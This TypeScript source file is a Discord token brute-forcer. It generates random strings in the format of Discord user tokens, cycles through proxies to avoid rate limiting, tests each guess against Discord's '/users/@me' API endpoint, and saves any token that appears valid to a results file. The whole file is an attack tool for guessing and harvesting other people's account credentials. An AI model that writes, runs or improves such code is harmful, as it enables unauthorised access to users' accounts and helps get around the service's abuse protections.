import { writeFileSync } from "fs";
import { join } from "path";
import request from "request";
import { OptionsType } from "../utils/preview";
import { ProxiesHandler } from "../utils/proxies_handler";

interface ToolManagerType {
  proxieshandler: ProxiesHandler;
  options: OptionsType;
}

export const ToolStartManager = ({ options, proxieshandler }: ToolManagerType): void => {
  const started_stamp: number = Date.now();
  let proxy: string, token: string, ipr: number;
  let i: number = (ipr = 0);

  const requestLoop = setInterval(() => {
    try {
      if (options.max_checks && options.max_checks <= i) {
        clearInterval(requestLoop);
        console.log(`Checking Done ${Date.now() - started_stamp}ms`);
        return;
      }
      token = g_token(Math.random() >= 0.5 ? 1 : 2);
      proxy = proxieshandler.proxies[ipr >= proxieshandler.proxies.length - 1 ? (ipr = 0) : ipr];

      if (!proxy) {
        throw new Error(`[${proxy}] Invalid proxy line`);
      }

      const requestEdited =
        options.proxiesQs === "yes"
          ? request.defaults({
              proxy: `${options.protocol}://${proxy}`,
            })
          : request;

      requestEdited.get(
        `https://discord.com/api/v${options.version}/users/@me`,
        {
          headers: {
            "Content-type": "application/json",
            Authorization: token,
          },
        },
        (error, _response, body) => {
          try {
            if (error || !body) {
              throw new Error("Invalid token generated");
            }
            const l = JSON.parse(body);
            if (l.code !== 0) {
              console.log(`[\x1b[32m+\x1b[0m] valid token [${token}]`);
              writeFileSync(join(__dirname, `../../result/token-${Date.now()}.txt`), `token -> ${token}`);
            } else throw new Error("Invalid token generated");
          } catch (e) {
            console.log(`[\x1b[31m+\x1b[0m] Invalid token [\x1b[35m${proxy}\x1b[0m][${token.slice(0, 30)}..]`);
          }
        },
      );
      ipr++;
      i++;
    } catch (e) {
      console.log(String(e));
    }
  }, options.delay_time * 1e3);
};

export const g_token = (version_token = 1): string => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz123456789_-";
  const gn = (_length: number) => {
    const p = [];
    for (let i = 0; i < _length; i++) {
      p.push(characters.charAt(~~(Math.random() * characters.length)));
    }
    return p.join("");
  };
  if (version_token === 2) {
    return `m${gn(2)}.${gn(84)}`;
  }
  return `N${gn(23)}.${gn(6)}.${gn(27)}`;
};
